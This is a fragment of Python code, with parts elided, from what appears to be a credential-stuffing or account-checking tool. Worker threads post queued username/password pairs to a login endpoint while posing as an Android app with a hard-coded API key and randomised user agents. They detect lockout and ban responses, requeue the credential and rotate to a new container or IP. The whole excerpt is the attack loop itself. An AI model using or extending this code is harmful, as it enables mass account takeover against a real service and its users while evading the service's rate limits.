    ...
    def run(self):
        while not q.empty():
            ...
            try:
                ...
                ua = get_ua()
                uid = uuid.uuid4()
                myusr = {"api_key": "15cb936e6d19cd7db1d6f94b96017541", "client": "Android-3.4.2.4.52178b52178",
                         "os": "22", "password": pas, "username": un, "uuid": uid.urn[9:]}
                headv1 = {
                ...
                r1 = r.post(loginURL, headers=headv1,
                            data=json.dumps(myusr), timeout=30)
                if r1.status_code == 200:
                    ...
                    if "Too many failed attempts" in r1.text or "Forbidden" in r1.text:
                        q.put(cred)
                        print("IPBANNED")
                        ban_ip(container)
                    else:
                        statusUpdate(cred, r1.text, container, 1)
                        countLoc()
